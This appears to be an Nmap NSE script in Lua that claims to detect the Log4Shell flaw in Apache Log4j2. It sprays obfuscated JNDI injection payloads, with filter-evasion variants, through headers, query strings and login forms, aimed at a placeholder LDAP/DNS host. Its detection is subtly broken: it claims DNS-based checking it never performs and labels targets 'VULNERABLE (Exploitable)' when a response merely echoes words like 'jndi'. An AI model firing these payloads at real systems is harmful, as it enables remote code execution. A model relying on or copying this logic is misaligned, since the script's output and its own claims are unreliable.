-- Log4Shell Vulnerability Detection (CVE-2021-44228)
-- Tests for Apache Log4j2 JNDI injection vulnerability
-- @output
-- 8080/tcp open  http
-- | http-log4shell:
-- |   VULNERABLE:
-- |   Log4Shell JNDI Injection Vulnerability (CVE-2021-44228)
-- |     State: VULNERABLE (Exploitable)
-- |     IDs:  CVE:CVE-2021-44228
-- |     Risk factor: CRITICAL  CVSSv3: 10.0 (CRITICAL) (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)
-- |       Apache Log4j2 JNDI features do not protect against attacker controlled LDAP
-- |       and other JNDI related endpoints. An attacker who can control log messages
-- |       or log message parameters can execute arbitrary code via JNDI lookups.
-- |     
-- |     Vulnerable paths:
-- |       /api/v1/search
-- |       /login
-- |     Disclosure date: 2021-12-10
-- |     References:
-- |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228
-- |_      https://logging.apache.org/log4j/2.x/security.html

description = [[
Attempts to detect the Log4Shell vulnerability (CVE-2021-44228) in Apache Log4j2
by sending specially crafted JNDI lookup strings in HTTP headers and parameters.

The vulnerability allows remote code execution through JNDI injection in log messages.
This script uses safe detection techniques without actually exploiting the vulnerability.
]]

author = "Nemue Security Team"
license = "MIT"
categories = {"vuln", "intrusive", "exploit"}

portrule = function(host, port)
    return port.service == "http" or port.service == "https" or
           port.number == 80 or port.number == 443 or
           port.number == 8080 or port.number == 8443 or
           port.number == 9200 or port.number == 9300
end

action = function(host, port)
    local http = require "http"
    local string = require "string"
    local math = require "math"
    
    -- Generate unique marker for detection
    local marker = string.format("NEMUE_LOG4J_%08x", math.random(0x10000000, 0x7fffffff))
    
    -- JNDI payloads using safe DNS-based detection
    local jndi_payloads = {
        "${jndi:ldap://" .. marker .. ".log4shell.nemue.test/a}",
        "${${lower:j}ndi:ldap://" .. marker .. ".log4shell.nemue.test/a}",
        "${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://" .. marker .. ".log4shell.nemue.test/a}",
        "${${::-j}${::-n}${::-d}${::-i}:ldap://" .. marker .. ".log4shell.nemue.test/a}",
        "${jndi:dns://" .. marker .. ".log4shell.nemue.test/a}",
        "${${lower:jndi}:${lower:dns}://" .. marker .. ".log4shell.nemue.test/a}",
    }
    
    -- HTTP headers to test
    local headers_to_test = {
        "User-Agent",
        "Referer",
        "X-Forwarded-For",
        "X-Forwarded-Host",
        "X-Real-IP",
        "Accept-Language",
        "X-Api-Version",
        "X-Request-ID",
        "Authorization",
        "Cookie",
    }
    
    -- Common paths that might log user input
    local test_paths = {
        "/",
        "/login",
        "/api",
        "/api/v1/search",
        "/api/v1/login",
        "/search",
        "/user",
        "/admin",
        "/actuator",
        "/actuator/health",
    }
    
    local vulnerable_paths = {}
    local vulnerable_headers = {}
    
    -- Test each path with JNDI payload in query parameters
    for _, path in ipairs(test_paths) do
        for _, payload in ipairs(jndi_payloads) do
            -- Test in query parameter
            local options = {
                header = {},
                bypass_cache = true,
            }
            
            -- Test with payload in various headers
            for _, header_name in ipairs(headers_to_test) do
                options.header[header_name] = payload
            end
            
            local url = path .. "?q=" .. payload
            local response = http.get(host, port, url, options)
            
            if response then
                -- Check if the server processed the JNDI lookup
                -- We can't directly detect DNS resolution, but we can check for:
                -- 1. Error messages indicating JNDI processing
                -- 2. Time-based detection (if JNDI causes delay)
                -- 3. Response patterns
                
                local body = response.body or ""
                local status = response.status
                
                -- Check for Log4j error patterns
                local log4j_errors = {
                    "log4j",
                    "Log4j",
                    "JNDI",
                    "jndi",
                    "LDAP",
                    "ldap://",
                    "InitialContext",
                    "javax.naming",
                }
                
                for _, err_pattern in ipairs(log4j_errors) do
                    if body:find(err_pattern) then
                        table.insert(vulnerable_paths, path)
                        break
                    end
                end
            end
        end
    end
    
    -- Test POST requests with JNDI payload in body
    for _, path in ipairs({"/login", "/api", "/api/v1/login"}) do
        for _, payload in ipairs(jndi_payloads) do
            local post_data = "username=" .. payload .. "&password=test"
            
            local options = {
                header = {
                    ["Content-Type"] = "application/x-www-form-urlencoded",
                    ["User-Agent"] = payload,
                },
                bypass_cache = true,
            }
            
            local response = http.post(host, port, path, options, nil, post_data)
            
            if response then
                local body = response.body or ""
                
                local log4j_errors = {
                    "log4j",
                    "Log4j",
                    "JNDI",
                    "jndi",
                }
                
                for _, err_pattern in ipairs(log4j_errors) do
                    if body:find(err_pattern) then
                        if not contains(vulnerable_paths, path) then
                            table.insert(vulnerable_paths, path)
                        end
                        break
                    end
                end
            end
        end
    end
    
    -- Check for known vulnerable applications
    local response = http.get(host, port, "/", {bypass_cache = true})
    if response then
        local server = response.header["Server"] or ""
        local x_powered = response.header["X-Powered-By"] or ""
        
        -- Check for common vulnerable frameworks
        local vulnerable_frameworks = {
            "Apache Struts",
            "Spring",
            "Tomcat",
            "JBoss",
            "WebLogic",
            "WebSphere",
            "Solr",
            "Elasticsearch",
            "Kafka",
            "Spark",
            "Druid",
        }
        
        for _, framework in ipairs(vulnerable_frameworks) do
            if server:find(framework) or x_powered:find(framework) then
                -- These frameworks commonly use Log4j
                -- Additional testing would be needed to confirm
                break
            end
        end
    end
    
    if #vulnerable_paths > 0 then
        local result = "VULNERABLE:\n"
        result = result .. "Log4Shell JNDI Injection Vulnerability (CVE-2021-44228)\n"
        result = result .. "  State: VULNERABLE (Exploitable)\n"
        result = result .. "  IDs:  CVE:CVE-2021-44228\n"
        result = result .. "  Risk factor: CRITICAL  CVSSv3: 10.0 (CRITICAL) (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)\n"
        result = result .. "    Apache Log4j2 JNDI features do not protect against attacker controlled LDAP\n"
        result = result .. "    and other JNDI related endpoints. An attacker who can control log messages\n"
        result = result .. "    or log message parameters can execute arbitrary code via JNDI lookups.\n"
        result = result .. "  \n"
        result = result .. "  Vulnerable paths:\n"
        for _, path in ipairs(vulnerable_paths) do
            result = result .. "    " .. path .. "\n"
        end
        result = result .. "  Disclosure date: 2021-12-10\n"
        result = result .. "  References:\n"
        result = result .. "    https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228\n"
        result = result .. "    https://logging.apache.org/log4j/2.x/security.html"
        return result
    end
    
    return "Not vulnerable to Log4Shell"
end

-- Helper function to check if table contains value
function contains(table, value)
    for _, v in ipairs(table) do
        if v == value then
            return true
        end
    end
    return false
end